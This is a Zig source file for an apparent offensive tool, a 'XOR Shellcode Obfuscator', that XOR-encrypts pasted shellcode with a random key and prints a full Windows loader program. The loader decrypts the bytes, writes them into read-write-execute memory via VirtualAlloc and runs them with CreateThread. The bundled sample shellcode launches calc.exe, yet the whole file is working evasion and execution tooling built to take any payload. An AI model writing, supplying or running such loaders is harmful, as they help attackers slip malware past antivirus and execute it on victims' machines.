const std = @import("std");
const fs = std.fs;
const mem = std.mem;
const process = std.process;
const print = std.debug.print;

// Parse hex string shellcode to binary
fn parseHexString(allocator: mem.Allocator, hex_string: []const u8) ![]u8 {
    var result = std.ArrayList(u8).init(allocator);
    defer result.deinit();
    
    var i: usize = 0;
    while (i < hex_string.len) {
        // Skip whitespace and commas
        if (hex_string[i] == ' ' or hex_string[i] == ',' or hex_string[i] == '\n' or hex_string[i] == '\t') {
            i += 1;
            continue;
        }
        
        // Look for "0x" prefix
        if (i + 1 < hex_string.len and hex_string[i] == '0' and hex_string[i + 1] == 'x') {
            i += 2; // Skip "0x"
            
            // Parse the next two hex digits
            if (i + 1 < hex_string.len) {
                const hex_byte = hex_string[i..i+2];
                const byte_value = std.fmt.parseInt(u8, hex_byte, 16) catch |err| {
                    print("Error parsing hex byte '{s}' at position {}: {}\n", .{ hex_byte, i, err });
                    i += 1;
                    continue;
                };
                try result.append(byte_value);
                i += 2;
            } else {
                break;
            }
        } else {
            i += 1;
        }
    }
    
    return result.toOwnedSlice();
}

// XOR obfuscation with rotating key and position-based scrambling
fn obfuscateShellcode(allocator: mem.Allocator, data: []const u8, key: [32]u8) ![]u8 {
    // Pad to 16-byte blocks
    const padding_len = 16 - (data.len % 16);
    const padded_len = data.len + padding_len;
    
    var encrypted = try allocator.alloc(u8, padded_len);
    
    // Copy original data
    @memcpy(encrypted[0..data.len], data);
    
    // Add PKCS#7 padding
    for (encrypted[data.len..]) |*byte| {
        byte.* = @as(u8, @truncate(padding_len));
    }
    
    // Simple encryption (XOR with rotating key)
    for (encrypted, 0..) |*byte, i| {
        const key_byte = key[i % key.len];
        byte.* ^= key_byte ^ @as(u8, @truncate(i));
    }
    
    return encrypted;
}

fn generateRandomKey() [32]u8 {
    var key: [32]u8 = undefined;
    var prng = std.Random.DefaultPrng.init(@as(u64, @bitCast(std.time.timestamp())));
    const random = prng.random();
    
    for (&key) |*byte| {
        byte.* = random.int(u8);
    }
    
    return key;
}

fn printZigProgram(obfuscated_data: []const u8, key: [32]u8, original_size: usize) void {
    print("// XOR-Obfuscated Shellcode - Generated by Zig Shellcode Obfuscator\n", .{});
    print("// Copy this entire program into a .zig file and compile\n\n", .{});
    
    print("const std = @import(\"std\");\n", .{});
    print("const windows = std.os.windows;\n", .{});
    print("const mem = std.mem;\n\n", .{});
    
    print("extern \"kernel32\" fn CloseHandle(hObject: ?windows.HANDLE) callconv(windows.WINAPI) windows.BOOL;\n\n", .{});
    
    print("const PAGE_EXECUTE_READWRITE = 0x40;\n", .{});
    print("const MEM_COMMIT = 0x1000;\n", .{});
    print("const MEM_RESERVE = 0x2000;\n\n", .{});
    
    print("fn getDecryptedShellcode(allocator: mem.Allocator) ![]u8 {{\n", .{});
    print("    const obfuscated_data = [_]u8{{\n        ", .{});
    
    // Print encrypted data
    for (obfuscated_data, 0..) |byte, i| {
        if (i > 0 and i % 16 == 0) {
            print("\n        ", .{});
        }
        print("0x{x:0>2}, ", .{byte});
    }
    print("\n    }};\n\n", .{});
    
    print("    const key = [_]u8{{\n        ", .{});
    for (key, 0..) |byte, i| {
        if (i > 0 and i % 16 == 0) {
            print("\n        ", .{});
        }
        print("0x{x:0>2}, ", .{byte});
    }
    print("\n    }};\n\n", .{});
    
    print("    var decrypted = try allocator.alloc(u8, obfuscated_data.len);\n", .{});
    print("    for (obfuscated_data, 0..) |byte, i| {{\n", .{});
    print("        const key_byte = key[i % key.len];\n", .{});
    print("        decrypted[i] = byte ^ key_byte ^ @as(u8, @truncate(i));\n", .{});
    print("    }}\n\n", .{});
    
    print("    const final_shellcode = try allocator.alloc(u8, {});\n", .{original_size});
    print("    @memcpy(final_shellcode, decrypted[0..{}]);\n", .{original_size});
    print("    allocator.free(decrypted);\n", .{});
    print("    return final_shellcode;\n", .{});
    print("}}\n\n", .{});
    
    print("pub fn main() !void {{\n", .{});
    print("    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};\n", .{});
    print("    defer _ = gpa.deinit();\n", .{});
    print("    const allocator = gpa.allocator();\n\n", .{});
    
    print("    const shellcode = try getDecryptedShellcode(allocator);\n", .{});
    print("    defer allocator.free(shellcode);\n\n", .{});
    
    print("    std.debug.print(\"Decrypted shellcode length: {{}}\\n\", .{{shellcode.len}});\n\n", .{});
    
    print("    const ptr = windows.kernel32.VirtualAlloc(null, shellcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n", .{});
    print("    if (ptr == null) return error.VirtualAllocFailed;\n\n", .{});
    
    print("    @memcpy(@as([*]u8, @ptrCast(ptr))[0..shellcode.len], shellcode);\n\n", .{});
    
    print("    const thread = windows.kernel32.CreateThread(null, 0, @ptrCast(ptr), null, 0, null);\n", .{});
    print("    if (thread == null) return error.CreateThreadFailed;\n\n", .{});
    
    print("    _ = windows.kernel32.WaitForSingleObject(thread.?, 5000);\n", .{});
    print("    _ = CloseHandle(thread.?);\n", .{});
    print("    _ = windows.kernel32.VirtualFree(ptr, 0, 0x8000);\n", .{});
    print("}}\n", .{});
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    print("=== XOR Shellcode Obfuscator ===\n", .{});
    print("Paste your hex shellcode (e.g., 0xfc, 0x48, 0x83, ...):\n", .{});
    
    // Example shellcode - replace with user input
    const hex_shellcode = "0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00";
    
    print("Converting hex string to binary...\n", .{});
    const binary_shellcode = try parseHexString(allocator, hex_shellcode);
    defer allocator.free(binary_shellcode);
    
    print("Parsed {} bytes of shellcode\n", .{binary_shellcode.len});
    
    // Generate random key
    const key = generateRandomKey();
    
    // Obfuscate the shellcode
    print("Obfuscating shellcode...\n", .{});
    const obfuscated_data = try obfuscateShellcode(allocator, binary_shellcode, key);
    defer allocator.free(obfuscated_data);
    
    print("Shellcode obfuscated successfully!\n", .{});
    print("Generating complete Zig program...\n\n", .{});
    print("================================================================================\n", .{});
    
    // Generate the complete Zig program
    printZigProgram(obfuscated_data, key, binary_shellcode.len);
    
    print("================================================================================\n", .{});
    print("\nComplete! Copy the generated program above into a .zig file and compile.\n", .{});
}
